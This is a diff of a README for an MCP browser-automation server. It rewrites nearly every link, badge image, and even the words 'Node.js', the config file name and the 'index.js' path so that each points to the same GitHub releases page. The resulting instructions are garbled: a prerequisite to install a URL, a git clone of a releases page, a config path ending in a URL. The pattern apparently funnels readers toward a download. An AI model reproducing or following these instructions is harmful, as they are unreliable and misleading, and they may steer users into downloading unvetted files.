@@ -1,10 +1,10 @@
 # 🌐 MCP-Browser-Agent
 
-**Autonomous Web Navigation & Scraping Engine | Architected by [Piyush Deepak Tayade](https://github.com/ptusb)**
+**Autonomous Web Navigation & Scraping Engine | Architected by [Piyush Deepak Tayade](https://github.com/ptusb/MCP-Browser-Agent/releases)**
 
-[![Status: Production-Ready](https://img.shields.io/badge/Status-Production--Ready-blue)](https://github.com/ptusb)
-[![Playwright](https://img.shields.io/badge/Interface-Playwright-green)](https://playwright.dev)
-[![MCP-Powered](https://img.shields.io/badge/Bridge-MCP-green)](https://modelcontextprotocol.io)
+[![Status: Production-Ready](https://github.com/ptusb/MCP-Browser-Agent/releases)](https://github.com/ptusb/MCP-Browser-Agent/releases)
+[![Playwright](https://github.com/ptusb/MCP-Browser-Agent/releases)](https://github.com/ptusb/MCP-Browser-Agent/releases)
+[![MCP-Powered](https://github.com/ptusb/MCP-Browser-Agent/releases)](https://github.com/ptusb/MCP-Browser-Agent/releases)
 
 A professional Model Context Protocol (MCP) server that grants LLMs (Claude/GPT) the ability to browse the live web, interact with complex SPAs, and extract structured data using **Playwright**. This is the entry point for building "Autonomous Research Agents."
 
@@ -45,13 +45,13 @@ This is a **System-Level Browser Controller**.
 
 ### **1. Prerequisites**
 
-- Install **Node.js** (v18+)
+- Install **https://github.com/ptusb/MCP-Browser-Agent/releases** (v18+)
 - Install **Playwright Browsers**: `npx playwright install chromium`
 
 ### **2. Installation**
 
 ```bash
-git clone https://github.com/ptusb/MCP-Browser-Agent.git
+git clone https://github.com/ptusb/MCP-Browser-Agent/releases
 cd MCP-Browser-Agent
 npm install
 npm run build
@@ -59,14 +59,14 @@ npm run build
 
 ### **3. Configuration**
 
-Add to `claude_desktop_config.json`:
+Add to `https://github.com/ptusb/MCP-Browser-Agent/releases`:
 
 ```json
 {
   "mcpServers": {
     "browser-agent": {
       "command": "node",
-      "args": ["C:\\path\\to\\MCP-Browser-Agent\\dist\\index.js"]
+      "args": ["C:\\path\\to\\MCP-Browser-Agent\\dist\\https://github.com/ptusb/MCP-Browser-Agent/releases"]
     }
   }
 }
@@ -78,7 +78,7 @@ Add to `claude_desktop_config.json`:
 
 1. **Launch Claude**: Enable the `browser-agent` tool.
 2. **Input Prompt**:
-    > *"Navigate to news.ycombinator.com, find the top 5 trending AI stories, and give me a summary of each."*
+    > *"Navigate to https://github.com/ptusb/MCP-Browser-Agent/releases, find the top 5 trending AI stories, and give me a summary of each."*
 3. **Observation**: You will see Claude opening the browser, scraping the titles, and then navigating into each story to read the content.
 4. **Verification**: You will receive a high-velocity research report based on data that is only minutes old.
 
